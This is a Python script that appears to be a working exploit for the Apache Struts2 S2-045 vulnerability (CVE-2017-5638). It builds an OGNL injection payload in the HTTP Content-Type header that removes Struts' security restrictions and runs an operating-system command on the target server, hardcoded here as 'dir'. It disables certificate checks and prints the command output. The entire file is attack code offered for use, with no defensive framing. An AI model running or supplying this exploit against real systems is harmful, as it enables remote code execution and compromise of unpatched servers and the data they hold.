#!/usr/bin/python

import urllib2
import requests
import httplib

from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#uso: python script.py <url> "<command>"
 
def exploit(url):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='dir')."
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
 
    try:

        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        #request = urllib2.Request(url, headers=headers)
        request = requests.get(url, headers=headers,verify=False)
        #page = urllib2.urlopen(request).read()

    except httplib.IncompleteRead, e:

        request = e.partial

    print(request.text)

    return request


def main():
    import sys
    if len(sys.argv) != 2:
        print("Usage: %s <url>" % sys.argv[0])
	print("");
        print("\te.g: %s http://localhost/" % sys.argv[0])
	print("");

    else:

        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        url = sys.argv[1]
        print("[*] cmd: %s\n" % 'dir')

        exploit(url)


if __name__ == '__main__':
     main()

